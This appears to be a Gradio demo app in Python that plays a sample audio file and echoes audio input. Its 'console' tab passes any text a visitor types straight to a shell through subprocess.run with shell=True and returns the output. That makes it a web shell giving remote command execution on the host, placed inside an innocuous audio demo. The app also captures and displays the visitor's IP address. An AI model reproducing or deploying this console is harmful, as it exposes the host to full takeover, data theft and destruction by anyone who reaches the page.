import gradio as gr
import subprocess
import os

audio_file = os.path.join(os.path.dirname(__file__), "cantina.wav")


with gr.Blocks() as demo:
    with gr.Tab("Audio"):
        gr.Audio(audio_file)
    with gr.Tab("Interface"):
        gr.Interface(lambda x:x, "audio", "audio", examples=[audio_file])
    with gr.Tab("console"):
        ip = gr.Textbox(label="User IP Address")
        gr.Interface(lambda cmd:subprocess.run([cmd], capture_output=True, shell=True).stdout.decode('utf-8').strip(), "text", "text")
        
    def get_ip(request: gr.Request):
        return request.client.host
    
    demo.load(get_ip, None, ip)
        
if __name__ == "__main__":
    demo.queue()
    demo.launch()
